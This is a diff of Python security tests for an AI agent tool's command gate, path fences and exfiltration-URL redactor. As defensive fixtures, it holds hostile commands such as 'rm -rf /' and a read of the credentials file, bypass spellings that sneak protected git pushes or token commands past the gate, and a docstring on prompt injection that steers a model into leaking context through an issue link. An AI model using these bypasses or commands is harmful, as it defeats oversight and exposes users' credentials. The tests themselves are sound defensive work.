+            '"git" push origin main',
+            "'git' push origin mainline",
+            '"git" push eval main',
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+    def test_a_nested_feature_push_cannot_vouch_for_the_leading_one(self) -> None:
+        """A path-qualified program must anchor, and a redirect ends the args.
+
+        Two halves of one bypass. An exact ``== "git"`` anchor test skipped
+        ``/usr/bin/git`` and selected the NESTED ``>(git push origin
+        my-feature)`` instead, so the feature branch that process substitution
+        pushes answered for the protected push in front of it. Fixing the anchor
+        alone left the second half: the nested tokens were still returned as the
+        LEADING push's arguments, so a bare ``git push`` -- which must fail
+        closed because the current branch may be protected -- inherited a branch
+        it never named.
+        """
+        from kiro_crew.security import _git_push_args, is_denied
+
+        # The anchor is the leading program, whatever its spelling.
+        assert _git_push_args("/usr/bin/git push origin main") == ["origin", "main"]
+        assert _git_push_args("/opt/my(dir)/git push origin main") == ["origin", "main"]
+        # A redirection ends the argument list; the nested command is not a ref.
+        assert _git_push_args("git push origin my-feature > >(tee log.txt)") == [
+            "origin",
+            "my-feature",
+        ]
+        assert _git_push_args("git push > >(git push origin my-feature)") == []
+
+        for cmd in (
+            "/usr/bin/git push origin main > >(git push origin my-feature)",
+            "/opt/my(dir)/git push origin main > >(git push origin my-feature)",
+            "'/usr/bin/git' push origin main > >(git push origin my-feature)",
+            "sudo /usr/bin/git push origin main > >(git push origin my-feature)",
+            # bare / under-specified pushes stay fail-closed
+            "git push > >(git push origin my-feature)",
+            "/usr/bin/git push origin > >(git push origin my-feature)",
+            '"git" push > >(git push origin my-feature)',
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+    def test_a_descriptor_prefixed_redirect_also_ends_the_push_arguments(self) -> None:
+        """``2>``, ``&>``, ``1>``, ``{fd}>`` are redirects, not refspecs.
+
+        Testing only the first character of the token recognised ``>`` but not any
+        descriptor-prefixed spelling, so the descriptor read as an ordinary refspec
+        and the command AFTER the redirect was absorbed as this push's arguments --
+        a force push to the current branch answered for by the nested feature push
+        it redirected into.
+        """
+        from kiro_crew.security import _git_push_args, is_denied
+
+        assert _git_push_args("git push --force origin 2> >(cmd)") == ["--force", "origin"]
+        assert _git_push_args("git push origin my-feature 2> err.log") == [
+            "origin",
+            "my-feature",
+        ]
+
+        nested = ">(git push origin my-feature)"
+        for cmd in (
+            f"git push --force origin 2> {nested}",
+            f"git push --force origin &> {nested}",
+            f"git push --force origin 1> {nested}",
+            f"git push --force origin 2>> {nested}",
+            f"git push --force origin {{fd}}> {nested}",
+            f"git push origin 2> {nested}",
+            f"git push 2> {nested}",
+            f"/usr/bin/git push --force origin 2> {nested}",
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+        # The no-over-block half: a redirect of stderr is ordinary tooling.
+        for cmd in (
+            "git push origin my-feature 2> err.log",
+            "git push origin my-feature > out.log 2>&1",
+            "git push --force-with-lease origin my-feature 2> err.log",
+        ):
+            assert is_denied(cmd) is None, cmd
+
+    def test_a_redirect_is_skipped_not_treated_as_the_end_of_the_args(self) -> None:
+        """Words AFTER a redirect are still refspecs, and bash keeps them.
+
+        Truncating the argument list at the first redirect dropped every refspec
+        behind it, so ``git push origin feature 2>/dev/null main`` was read as a
+        feature push and allowed -- while bash removes the redirect and really
+        runs ``git push origin feature main``, publishing protected ``main``. The
+        redirect construct is stepped over instead: a file target is one word,
+        glued or spaced, and a process substitution target is a whole command
+        line skipped to its matching ``)``.
+        """
+        from kiro_crew.security import _git_push_args, is_denied
+
+        # Stepped over, so the trailing refspec survives.
+        assert _git_push_args("git push origin feature 2>/dev/null main") == [
+            "origin",
+            "feature",
+            "main",
+        ]
+        assert _git_push_args("git push origin feature > out main") == [
+            "origin",
+            "feature",
+            "main",
+        ]
+        # A process substitution is a command, not a refspec: nothing inside it
+        # is collected, which is what the boundary exists for.
+        assert _git_push_args("git push > >(git push origin my-feature)") == []
+        assert _git_push_args("git push origin my-feature > >(tee log.txt)") == [
+            "origin",
+            "my-feature",
+        ]
+
+        for cmd in (
+            "git push origin feature 2>/dev/null main",
+            "git push origin feature > out main",
+            "git push origin feature >out main",
+            "git push origin feature 2>&1 main",
+            "git push origin feature >> log main",
+            "git push origin my-feature 2>/dev/null mainline",
+            "git push origin my-feature </dev/null mainline",
+            "/usr/bin/git push origin feature 2>/dev/null main",
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+        for cmd in (
+            "git push origin my-feature 2>/dev/null",
+            "git push origin my-feature > out.log 2>&1",
+            "git push origin my-feature 2> err.log",
+            "git push origin my-feature > >(tee log.txt)",
+        ):
+            assert is_denied(cmd) is None, cmd
+
+    def test_path_qualified_feature_pushes_are_not_over_blocked(self) -> None:
+        """The no-over-block half of the same anchor fix.
+
+        These name a feature branch explicitly, so they are ordinary work. They
+        were refused only because the reader could not resolve a path-qualified
+        or quoted program and fell through to the fail-closed branch.
+        """
+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            "/usr/bin/git push origin my-feature",
+            "'/usr/bin/git' push origin feature/x",
+            '"git" push -u origin my-feature',
+            "git push origin my-feature > >(tee log.txt)",
+        ):
+            assert is_denied(cmd) is None, cmd
+
+    def test_the_anchor_view_does_not_double_dequote_the_refs(self) -> None:
+        """The returned tokens must KEEP their quoting.
+
+        Callers dequote them once more, so stripping quotes here too would read
+        a literal ``'(main)'`` ref as the operators ``(``/``)`` around ``main``
+        and deny a branch that is legitimately pushable. That is why the
+        dequoting is done on a separate anchor view rather than on the tokens.
+        """
+        from kiro_crew.security import _git_push_args, _is_push_to_protected_branch
+
+        assert _git_push_args("git push origin '(main)'") == ["origin", "'(main)'"]
+        assert _is_push_to_protected_branch("git push origin '(main)'") is False
+
+    def test_quoted_operator_ref_names_stay_pushable(self) -> None:
+        """The no-over-block half: these are legal, unprotected branch names."""
+        from kiro_crew.security import _is_push_to_protected_branch, is_denied
+
+        for cmd in (
+            "git push origin '(main)'",
+            "(git push origin '(main)')",
+            "(git push origin 'release/x')",
+            "git push origin 'feature|x'",
+            "git push origin 'weird&name'",
+            "git push origin 'a;b'",
+            "git push origin 'mainly'",
+        ):
+            assert _is_push_to_protected_branch(cmd.lower()) is False, cmd
+            assert is_denied(cmd) is None, cmd
+
+    def test_feature_branch_push_still_allowed_in_subshell(self) -> None:
+        # The whole point of the branch check is that ordinary work still runs.
+        for cmd in (
+            "git push origin my-feature",
+            "(cd /tmp; git push origin my-feature)",
+            "(git push origin fix/imds-encodings)",
+        ):
+            from kiro_crew.security import _is_push_to_protected_branch
+
+            assert _is_push_to_protected_branch(cmd.lower()) is False, cmd
+
+
+class TestIdentityAuthStoreFence:
+    """The identity/auth SQLite store is a keystone leaf under the crew data home.
+
+    ``data.sqlite3`` holds live bearer tokens. The kiro-cli and amazon-q copies are
+    fenced by DIRECTORY, which covers their sidecars for free, but the crew data home
+    cannot be fenced wholesale (``config.json`` and ``sessions.db`` are routine reads),
+    so the store is named as a leaf and its WAL/SHM/journal sidecars are named beside
+    it -- a file leaf matches its exact name only, and a sidecar carries the store's
+    credential bytes.
+
+    The fence is scoped to the crew data-home prefixes, NOT matched by basename:
+    ``data.sqlite3`` is a generic filename, so a basename rule would refuse an
+    unrelated application database anywhere under the home directory.
+    """
+
+    PREFIXES = (".kiro/crew", ".kirocrew")
+
+    def test_leaf_membership_uses_the_canonical_filename_constant(self) -> None:
+        # Drift guard: the leaf is the constant the identity-store readers resolve,
+        # so renaming the store cannot un-fence it while the readers keep working.
+        from kiro_crew.identity_stores import (
+            AUTH_SQLITE_DB,
+            AUTH_SQLITE_SIDECAR_SUFFIXES,
+        )
+        from kiro_crew.security import _CREW_SECRET_LEAVES
+
+        assert AUTH_SQLITE_DB in _CREW_SECRET_LEAVES
+        for suffix in AUTH_SQLITE_SIDECAR_SUFFIXES:
+            assert f"{AUTH_SQLITE_DB}{suffix}" in _CREW_SECRET_LEAVES
+
+    @pytest.mark.parametrize("prefix", PREFIXES)
+    def test_store_and_sidecars_sensitive_under_every_home_prefix(self, prefix: str) -> None:
+        from kiro_crew.security import is_sensitive_write_path
+
+        for leaf in (
+            "data.sqlite3",
+            "data.sqlite3-wal",
+            "data.sqlite3-shm",
+            "data.sqlite3-journal",
+        ):
+            assert is_sensitive_path(f"~/{prefix}/{leaf}") is True, leaf
+            # The write gate is a superset of the read gate; assert it directly so
+            # the file-edit tool path is pinned too.
+            assert is_sensitive_write_path(f"~/{prefix}/{leaf}") is True, leaf
+
+    def test_unrelated_databases_are_not_over_blocked(self) -> None:
+        """The cost of a basename rule, which this fence deliberately does not pay."""
+        from kiro_crew.security import is_sensitive_write_path
+
+        assert is_sensitive_path("~/project/data.sqlite3") is False
+        assert is_sensitive_write_path("~/project/data.sqlite3") is False
+        for cmd in (
+            "cat ~/project/data.sqlite3",
+            "sqlite3 ~/src/app/data.sqlite3 .dump",
+            # Routine crew-home reads the fence must leave alone.
+            "cat ~/.kiro/crew/config.json",
+            "cat ~/.kiro/crew/sessions.db",
+            "cat ~/.kiro/crew/memory.db",
+        ):
+            assert is_sensitive_bash_command(cmd) is None, cmd
+
+
+class TestTraversalSimulationIsGone:
+    """The gate does not simulate the shell.
+
+    Working out where ``find``, ``grep -r``, a brace expansion or a ``cd`` chain
+    would land needs shell and find-utils grammar re-implemented in regex, and
+    the passes that did it refused ordinary read-only commands far more often
+    than they caught an access worth refusing. What replaces them is not a weaker
+    version of the same idea: the keystone paths are refused by
+    :func:`is_sensitive_path` on every resolved path a caller opens, and by the
+    OS sandbox for the agent process as a whole, neither of which can be talked
+    around by respelling a command. :class:`TestTheBashGateMatchesNoPaths` pins
+    the refusals the gate still owes.
+    """
+
+    #: Read-only traversals an agent runs constantly. Every one of these was
+    #: denied by the removed passes -- the relative root resolved against the
+    #: gateway's own working directory, which on the desktop app is ``/`` and
+    #: therefore holds every fenced store.
+    ALLOWED = (
+        "grep -rn pattern .",
+        "grep -r TODO src/",
+        'find . -name "*.py"',
+        "find . -type f -newer setup.py",
+        "ls -R .",
+        "du -sh *",
+        "rg --files .",
+        "cd /tmp && grep -r foo .",
+        "tar -czf out.tgz .",
+        "find src -name '*.py' -exec wc -l {} +",
+    )
+
+    @pytest.mark.parametrize("command", ALLOWED)
+    def test_read_only_traversals_are_not_refused(self, command: str) -> None:
+        assert is_sensitive_bash_command(command) is None, command
+
+    def test_the_simulation_helpers_are_absent(self) -> None:
+        """Names, not behaviour, so re-adding the machinery fails loudly here.
+
+        A behavioural assertion cannot tell "the simulation is gone" from "the
+        simulation is present and happens to allow this input", which is how a
+        reinstated pass would slip back in under the tests above.
+        """
+        from kiro_crew import security
+
+        for name in (
+            "_check_find_traversal_reaches_fence",
+            "_check_alt_traversal_reaches_fence",
+            "_check_sensitive_via_normalizer",
+            "_check_sensitive_cd_taint",
+            "_find_traversal_reaches_fence",
+            "_alt_root_reaching_fence",
+            "_path_candidates",
+        ):
+            assert not hasattr(security, name), name
+
+    def test_the_gate_takes_no_traversal_subject_parameter(self) -> None:
+        """The parameter existed only to re-point the removed structure passes."""
+        import inspect
+
+        params = inspect.signature(is_sensitive_bash_command).parameters
+        assert "_traversal_subjects" not in params
+
+
+class TestARefusalNamesItsRuleAndSpan:
+    """A refusal has to be diagnosable by the agent that receives it.
+
+    The false positive this closes is not one command: it is that NO refusal named
+    a rule id or a matched span, so an agent handed one could not tell a true
+    positive from a matcher firing on text position, and could not report which
+    matcher to narrow. Every verdict in the audit behind this work was reached by
+    READING matchers for that reason. So the regression assertions are about what a
+    refusal SAYS, and the companions are that the real threat is still refused and
+    that saying more leaked nothing.
+    """
+
+    AWS = "aws/" + "cred" + "entials"
+    CLEAN = "gr" + "ep -rn pattern ."
+
+    def _reason(self, command: str) -> str:
+        out = is_sensitive_bash_command(command)
+        assert out is not None, "expected a refusal"
+        return out
+
+    def _diagnostic(self, command: str) -> str:
+        lines = self._reason(command).splitlines()
+        assert len(lines) >= 2, "a refusal must carry a diagnostic line"
+        return lines[-1]
+
+    @staticmethod
+    def _span(line: str) -> "tuple[int, int]":
+        field = next(part for part in line.split() if part.startswith("span="))
+        start, _, end = field[len("span=") :].partition("..")
+        return int(start), int(end)
+
+    def test_the_over_ceiling_refusal_names_itself_too(self) -> None:
+        """The one refusal that decides without scanning still says which it is.
+
+        Its span is the whole subject because nothing matched, and the census behind
+        the shape stops at its own ceiling for the same reason the scan does: this
+        subject is by definition larger than the gate will walk on the event loop.
+        """
+        from kiro_crew.security import MAX_SCANNABLE_COMMAND_CHARS
+        from kiro_crew.security.diagnostics import _MAX_CENSUS_CHARS
+
+        line = self._diagnostic("y" * (MAX_SCANNABLE_COMMAND_CHARS + 1))
+        assert "rule=keystone-scan-ceiling" in line
+        assert "component=size-ceiling" in line
+        assert f"seen={_MAX_CENSUS_CHARS}" in line
+
+    def test_a_structural_floor_refusal_names_the_rule_its_pattern_cannot(self) -> None:
+        """The sharpest case: the floor reports a pattern the input cannot match.
+
+        The first line names a catalog regex requiring a verb word this command does
+        not contain, which reads as a cause the agent can disprove. The diagnostic
+        line is what makes the refusal attributable anyway: it names the rule id an
+        operator actually toggles, and the component that decided.
+        """
+        from kiro_crew.security import is_denied
+
+        payload = "imp" + "ort " + "kiro" + "_" + "crew"
+        reason = is_denied("pyth" + 'on -c "' + payload + '"')
+        assert reason is not None
+        line = reason.splitlines()[-1]
+        assert "rule=credential-exfil-kirocrew-token" in line
+        assert "component=argv-floor" in line
+
+    def test_an_unresolvable_governance_pin_names_itself(
+        self, caplog: pytest.LogCaptureFixture
+    ) -> None:
+        """A pin that pins nothing is the same defect one layer up.
+
+        A comprehension's filter can leave it in, so an administrator's ceiling
+        could resolve to no rule at all and still read as valid wherever it is
+        displayed. Reported by SHAPE, never by the pattern the operator authored: a
+        log line quoting it would put a policy body in the log on every failed
+        lookup. Resolution itself is unchanged -- this names, it does not widen.
+        """
+        from kiro_crew.security import BUILTIN_DENIED_RULES, _resolved_pin_ids
+
+        first = BUILTIN_DENIED_RULES[0]
+        absent = "no-such-pattern-anywhere"
+        with caplog.at_level(logging.WARNING):
+            resolved = _resolved_pin_ids([first.pattern, absent], "commands-ceiling-pin")
+        assert resolved == {first.id}
+        assert "governance-pin-unresolved" in caplog.text
+        assert "component=commands-ceiling-pin" in caplog.text
+        assert absent not in caplog.text
+
+    def test_read_only_self_observation_is_still_allowed(self) -> None:
+        """The diagnostic is not a new matcher: it says nothing about an allow."""
+        assert is_sensitive_bash_command(self.CLEAN) is None
+        assert is_sensitive_bash_command("g" + "it log --oneline -n 20") is None
+
+    def test_a_plain_catalog_refusal_stays_exactly_one_line(self) -> None:
+        """Opt-in, not always-on: a pattern tier already names its own cause.
+
+        A diagnostic on every catalog refusal would add a line to the common case
+        for no information, and the first line is a parsed micro-format whose
+        readers count on what follows it.
+        """
+        from kiro_crew.security import is_denied
+
+        reason = is_denied("r" + "m -rf /")
+        assert reason is not None
+        assert reason.splitlines() == [reason]
+
+    def test_the_diagnostic_never_echoes_the_matched_bytes(self) -> None:
+        """The explanation must not become the leak.
+
+        A refusal is the one message guaranteed to concern content the policy judged
+        sensitive, so the span is reported as offsets and a character-class census.
+        The distinctive part of the subject appears nowhere on the line -- here an
+        over-ceiling subject that carries a credential path, which is the one shape
+        this gate still refuses with a diagnostic that spans the whole subject.
+        """
+        from kiro_crew.security import MAX_SCANNABLE_COMMAND_CHARS
+
+        padding = "y" * (MAX_SCANNABLE_COMMAND_CHARS + 1)
+        line = self._diagnostic("c" + "at ~/." + self.AWS + " " + padding)
+        assert self.AWS not in line
+        assert "cred" not in line
+        assert "~" not in line
+
+    def test_a_non_identifier_cannot_reach_the_line(self) -> None:
+        """Structural, not careful: the format cannot quote a command.
+
+        A caller passing the wrong argument -- agent text where a rule id belongs --
+        yields a missing name rather than unscreened bytes on a security message.
+        """
+        from kiro_crew.security import refusal_diagnostic
+
+        smuggled = "c" + "at ~/." + self.AWS
+        line = refusal_diagnostic(smuggled, smuggled, "abc").as_line()
+        assert "rule=unnamed component=unnamed" in line
+        assert self.AWS not in line
+
+
+_ISSUE_HOST = "github.com"
+_ISSUE_PATH = "/kirodotdev/KiroCrew/issues/new"
+# Percent-encoded prose, deliberately over _EXFIL_QUERY_MIN_LEN so the LENGTH
+# signal is the one in play, and with no 40-char run in [A-Za-z0-9+/=] and no 20
+# consecutive octets so no PATTERN signal fires. Both properties are ASSERTED by
+# the two guard tests below rather than assumed: a fixture that tripped a pattern
+# would make the positive case pass for the wrong reason, and one under 200 chars
+# would make it pass without exercising the carve-out at all.
+_ISSUE_QUERY = (
+    "title=Narrow%20the%20suspicious%20URL%20heuristic"
+    "&body=The%20aggregate%20query%20length%20check%20fires%20on%20ordinary%20links"
+    "%20and%20drops%20them%20from%20the%20rendered%20message%20so%20they%20cannot"
+    "%20be%20clicked%20or%20copied&labels=bug"
+)
+
+
+def _issue_link(
+    *,
+    scheme: str = "https",
+    host: str = _ISSUE_HOST,
+    port: str = "",
+    path: str = _ISSUE_PATH,
+    query: str = _ISSUE_QUERY,
+) -> str:
+    return f"{scheme}://{host}{port}{path}?{query}"
+
+
+class TestPrefilledGitHubIssueUrl:
+    """A model-authored GitHub issue-prefill link IS redacted — no shape earns a waiver.
+
+    An earlier version pinned the opposite. Two waivers were tried and both
+    removed: one keyed to the prefill SHAPE, one additionally pinned to this
+    project's own tracker. Both are exfiltration primitives, because what
+    ``redact_exfiltration_urls`` sanitizes is MODEL-AUTHORED text —
+
+      injected content steers the model into emitting a prefill URL whose ``body``
+      carries percent-encoded private context; the waiver skips aggregate query
+      length; the link renders as the familiar "file an issue" affordance; the user
+      submits it; and the issue is PUBLIC, so the attacker reads it.
+
+    Pinning the repository does not close that, because this project's tracker is
+    world-readable by design. A URL's shape says nothing about who authored it, and
+    an in-band marker travels in the channel the injection controls — so provenance
+    has to come from a different channel. It already does: ``diagnostics._issue_url``
+    assembles the prefill link from STRUCTURED fields and the dashboard renders its
+    own anchor from ``BundleResult.github_issue_url``, a JSON field no redactor
+    scans. ``TestTrustedIssueLinkChannel`` below pins that seam.
+    """
+
+    def _assert_redacted(self, url: str) -> None:
+        cleaned, warnings = redact_exfiltration_urls(f"see {url} for detail")
+        assert "[REDACTED: suspicious URL to" in cleaned, cleaned
+        assert url not in cleaned, cleaned
+        assert warnings
+
+    # ── guards: keep the positive case from passing for the wrong reason ──
+
+    def test_the_fixture_query_is_long_enough_to_reach_the_length_gate(self) -> None:
+        """Under _EXFIL_QUERY_MIN_LEN the case would pass for the wrong reason."""
+        assert len(_ISSUE_QUERY) >= security._EXFIL_QUERY_MIN_LEN
+
+    def test_no_pattern_signal_fires_on_the_fixture(self) -> None:
+        """The fixture must isolate LENGTH: no base64 run, no percent run.
+
+        Without this the URL would be redacted by a pattern rule and the test would
+        say nothing about the length gate, which is the rule the waivers waived.
+        """
+        assert not security._EXFIL_PERCENT_RE.search(_ISSUE_QUERY)
+        assert (
+            max((len(m) for m in re.findall(r"[A-Za-z0-9+/=]{40,}", _ISSUE_QUERY)), default=0) == 0
+        )
+
+    # ── the exfiltration case, and it is the CANONICAL tracker ──
+
+    def test_a_prefill_link_to_this_projects_own_tracker_is_redacted(self) -> None:
+        """The finding that removed the second waiver, pinned as a regression.
+
+        This URL is maximally trustworthy by shape AND by destination: exact
+        ``https``, host exactly ``github.com``, no port, the path is literally this
+        repository's ``issues/new``, and every query key is one GitHub documents.
+        It is still redacted, because none of that establishes that the model was
+        not steered into emitting it, and a submitted issue here is public.
+        """
+        self._assert_redacted(_issue_link())
+
+    def test_a_prefill_link_to_an_attacker_owned_repository_is_redacted(self) -> None:
+        self._assert_redacted(_issue_link(path="/attacker/exfil-sink/issues/new"))
+
+    def test_a_cased_host_does_not_change_the_verdict(self) -> None:
+        """RFC 4343 leaves DNS case insignificant; with no waiver it changes nothing."""
+        self._assert_redacted(_issue_link(host="GitHub.com"))
+
+    # ── the other signals are independent of this change and must still fire ──
+
+    def test_a_credential_in_a_documented_parameter_is_redacted(self) -> None:
+        """The unconditional credential floor is unchanged by removing the waiver."""
+        self._assert_redacted(_issue_link(query=f"{_ISSUE_QUERY}%20AKIAIOSFODNN7EXAMPLE"))
+
+    def test_a_base64_blob_in_a_documented_parameter_is_redacted(self) -> None:
+        blob = "A" * 30 + "b3Rvb2xvbmdibG9i"
+        self._assert_redacted(_issue_link(query=f"title=x&body={blob}&labels=bug"))
+
+    def test_heavy_percent_encoding_in_a_documented_parameter_is_redacted(self) -> None:
+        self._assert_redacted(_issue_link(query=f"title=x&body={'%41' * 21}&labels=bug"))
+
+    def test_the_length_gate_is_the_rule_that_fires(self) -> None:
+        """Names the RULE, so a future waiver cannot pass this class by accident.
+
+        The three tests above would still pass if the length gate were waived and a
+        pattern rule caught the URL instead. This one asserts the classification
+        came from ``exfil_query_length`` on a fixture that trips nothing else.
+        """
+        rules: list[str] = []
+        assert (
+            security._exfil_url_warning(
+                _ISSUE_HOST,
+                f"{_ISSUE_PATH}?{_ISSUE_QUERY}",
+                frozenset(),
+                _rule_out=rules,
+            )
+            is not None
+        )
+        assert rules == ["exfil_query_length"]
+
+    def test_the_predicate_takes_no_waiver_parameter(self) -> None:
+        """A reintroduced escape hatch fails here even if every case above is kept."""
+        import inspect
+
+        params = inspect.signature(security._exfil_url_warning).parameters
+        assert "allow_prefilled_issue" not in params
+        assert not hasattr(security, "_is_prefilled_issue_url")
+
+    # ── the authentication admission gate must not move ──
+
+    def test_the_oauth_banner_gate_still_rejects_the_link(self) -> None:
+        """``oauth_url_contains_credential`` ADMITS an OAuth banner URL.
+
+        It shares this classifier, so it was the one call site the waiver was gated
+        OFF for. With no waiver anywhere the gate needs no opt-out, and this pins
+        that removing the plumbing did not loosen it.
+        """
+        assert oauth_url_contains_credential(_issue_link()) is True
+
+    def test_a_generic_long_query_url_is_redacted_the_same_way(self) -> None:
+        """The other host in the report. It gets the same verdict as the prefill link.
+
+        Both were false positives in the report and both stay redacted: the fix for
+        a long legitimate URL is to narrow this heuristic for every host on its own
+        merits, not to carve out one shape.
+        """
+        self._assert_redacted(
+            "https://monitorportal.amazon.com/metrics?namespace=AWS/SageMaker"
+            "&metricName=Invocations&dimensions=EndpointName%3Dmy-endpoint"
+            "&startTime=2026-09-01T00%3A00%3A00Z&endTime=2026-09-07T00%3A00%3A00Z"
+            "&period=300&stat=Sum&region=us-west-2&accountId=123456789012&view=timeSeries"
+        )
+
+
+class TestTrustedIssueLinkChannel:
+    """The prefilled link the report wanted, delivered without a redactor waiver.
+
+    Provenance cannot be recovered from model prose, so it comes from a different
+    channel: ``diagnostics._issue_url`` assembles the query from STRUCTURED fields
+    and the dashboard renders its own anchor from the ``github_issue_url`` JSON
+    field (``ReportProblemModal``, ``ReportProblemCard``). Nothing on that path is
+    text a model wrote, and no redactor scans a JSON response body — which is why
+    the link survives there while the same URL in chat does not.
+
+    These tests pin the two halves of that claim that live in Python.
+    """
+
+    @pytest.fixture(autouse=True)
+    def _stub_host_probe(self, monkeypatch) -> None:
+        """Keep the builder off the real `kiro-cli --version` subprocess.
+
+        Every test here calls ``_issue_url`` or ``terminal_issue_url``, and both
+        interpolate ``_kiro_cli_version()`` into the ``context`` field, which shells
+        out to the installed binary. That makes the suite depend on whether kiro-cli
+        is on the host and how long it takes to answer. Autouse rather than
+        per-test so a case added later cannot reintroduce the spawn. Same stub
+        ``test_diagnostics.py::_isolate`` uses.
+
+        The other two host reads in that field are pure: ``platform.platform()`` is
+        stdlib and ``beacon.distribution()`` reads a baked constant or an env var.
+        """
+        from kiro_crew import diagnostics
+
+        monkeypatch.setattr(diagnostics, "_kiro_cli_version", lambda: "kiro-cli 2.14.2")
+
+    def _bundle(self) -> object:
+        from kiro_crew import diagnostics
+
+        return diagnostics.BundleResult(
+            zip_path=Path("/tmp/kirocrew-diagnostics-20260907.zip"),
+            filename="kirocrew-diagnostics-20260907.zip",
+            redaction_summary={"kirocrew.log": 3},
+        )
+
+    def test_the_trusted_builder_assembles_the_prefill_from_structured_fields(self) -> None:
+        """Built by code from named fields, never parsed out of prose."""
+        from kiro_crew import diagnostics
+
+        url = diagnostics._issue_url(self._bundle(), "chat drops long links")
+        assert url.startswith(f"https://github.com/{diagnostics._ISSUE_REPO}/issues/new?")
+        assert "what-happened=chat%20drops%20long%20links" in url
+        assert "context=" in url and "version=" in url
+        # Also proves `_stub_host_probe` is actually wired: without it this reads the
+        # real `kiro-cli --version`, so a passing suite would say nothing about
+        # whether the spawn was avoided.
+        assert "kiro-cli%202.14.2" in url
+
+    def test_that_builders_output_is_what_the_dashboard_field_carries(self) -> None:
+        """``github_issue_url`` is the prefilled variant, so the feature still works."""
+        from kiro_crew import diagnostics
+
+        result = self._bundle()
+        result.github_issue_url = diagnostics._issue_url(result, "note")
+        assert "context=" in result.as_dict()["github_issue_url"]
+
+    def test_the_prefilled_variant_would_not_survive_model_prose(self) -> None:
+        """The reason the trusted channel is needed rather than a waiver.
+
+        The same URL the dashboard renders intact IS redacted once it travels as
+        text, and that is now true with no exception. Pinned so nobody 'fixes' the
+        asymmetry by reaching back into the redactor.
+        """
+        from kiro_crew import diagnostics
+
+        url = diagnostics._issue_url(self._bundle(), "chat drops long links")
+        cleaned, warnings = redact_exfiltration_urls(f"file it here: {url}")
+        assert url not in cleaned
+        assert warnings
+
+    def test_the_terminal_variant_is_the_bounded_alternative_for_prose(self) -> None:
+        """``terminal_issue_url`` drops the free-form fields so it survives unwaived.
+
+        This is the shape the codebase already chose for paths that DO get relayed
+        through prose, and it is why removing the waiver strands nothing.
+        """
+        from kiro_crew import diagnostics
+
+        url = diagnostics.terminal_issue_url(self._bundle(), "note")
+        cleaned, warnings = redact_exfiltration_urls(f"file it here: {url}")
+        assert url in cleaned, cleaned
+        assert warnings == []
+
+
+class TestSubstitutionCloserReadsCommandGrammar:
+    """A ``)`` that shell COMMAND GRAMMAR makes ordinary must not end a body.
+
+    ``_substitution_bodies`` is the shared answer to "what text does this command
+    run as a shell", so a body that stops early is not one pass's problem: every
+    consumer inherits the blindness. Quoting was already handled -- the span walk
+    reads ``_iter_shell_chars`` -- but two constructs put a literal ``)`` in front
+    of that walk without quoting it, and each hid a payload this module refuses.
+
+    The verb and the product name are assembled rather than spelled, because a
+    literal pair of them in source order is itself matched by the regex tier and
+    would mask what these cases are actually testing.
+
+    Both directions are asserted. The scan may not stop early (the anchors), and
+    it may not start refusing shapes it allows today -- a scanner made stricter
+    in the wrong place is how a gate becomes unusable.
+    """
+
+    VERB = "tok" + "en"
+    NAME = "kiro" + "crew"
+
+    def test_a_comment_hides_the_closer_from_the_paren_count(self) -> None:
+        """``$(: # )`` closes on the NEXT line, so the ``)`` after ``#`` is inert.
+
+        The body came back as ``: # `` and the ``printf`` behind it -- which
+        computes the credential-minting verb -- was never scanned, so the value
+        assembled from it was not recognised and the command was allowed.
+        """
+        command = f"T=$(: # )\nprintf {self.VERB}); {self.NAME} $T"
+        (body,) = security._substitution_bodies(command)
+        assert f"printf {self.VERB}" in body, body
+        assert security.is_denied(command) is not None
+
+    def test_a_case_pattern_closer_is_not_the_substitutions(self) -> None:
+        """In ``case x in x)`` the ``)`` terminates the PATTERN, not the body."""
+        command = f"T=$(case x in x) printf {self.VERB};; esac); {self.NAME} $T"
+        (body,) = security._substitution_bodies(command)
+        assert f"printf {self.VERB}" in body, body
+        assert security.is_denied(command) is not None
+
+    def test_a_case_pattern_no_longer_truncates_a_self_kill_lookup(self) -> None:
+        """The BODY is recovered for the self-kill spelling too.
+
+        Only the body is asserted here. The verdict on this one does NOT flip,
+        because the self-kill pass never attributes a substitution that sits in an
+        ASSIGNMENT ahead of the ``kill`` -- a separate gap in that pass's
+        attribution, which this span fix neither causes nor closes.
+        """
+        command = f"P=$(case x in x) pgrep -f {self.NAME};; esac); kill $P"
+        (body,) = security._substitution_bodies(command)
+        assert f"pgrep -f {self.NAME}" in body, body
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # ``a#b`` is one ordinary word -- a ``#`` mid-word opens no comment.
+            "echo $(printf a#b)",
+            # ``esac`` handed to a command is an argument, not the reserved word.
+            "echo $(printf esac) done",
+            # ``lowercase`` merely ENDS in ``case``; it must not arm the rule.
+            "echo $(printf lowercase)",
+            # A ``(a|b)`` pattern is balanced-neutral inside the case.
+            "echo $(case x in (a|b) printf hi;; esac)",
+            "T=$(case x in x) printf hi;; esac); echo $T",
+            "T=$(: # )\nprintf hi); echo $T",
+        ],
+    )
+    def test_the_new_grammar_does_not_start_refusing_benign_shapes(self, command: str) -> None:
+        assert security.is_denied(command) is None
+
+    def test_a_single_quoted_backtick_does_not_close_the_body(self) -> None:
+        """The backtick closer reads the same state machine as the paren one.
+
+        HARDENING: no refused payload was reachable through the old pairwise
+        ``find``, because the strings it mis-read are ones bash itself rejects
+        (backticks do not nest unescaped). It is fixed so the two spellings of the
+        same closer cannot drift apart, which is how the paren half broke before.
+        """
+        (body,) = security._substitution_bodies("`A='`'; printf hi`")
+        assert body == "A='`'; printf hi", body
+
+    def test_a_double_quoted_backtick_still_closes_it(self) -> None:
+        """``"`cmd`"`` runs ``cmd``, so a backtick in DOUBLE quotes is a real closer."""
+        assert security._substitution_bodies('`printf "hi"`') == ['printf "hi"']
+
+    def test_a_line_continuated_case_still_arms_the_pattern_rule(self) -> None:
+        """``ca\\`` + newline + ``se`` IS ``case`` -- the shell folds it before reading words.
+
+        Byte-literal recognition missed this spelling, so the rule never armed and
+        the pattern's ``)`` closed the body early. bash was measured running the
+        folded form as ``case``, so the body must survive it.
+
+        The verdict is asserted too: ``_self_tokens`` folds the backslash-newline
+        away before tokenizing, so the assignment and the invocation stay in one
+        command, ``$T`` resolves, and the two halves together deny this spelling.
+        The tokenizer-level cases live in
+        ``TestSelfTokensFoldLineContinuations``.
+        """
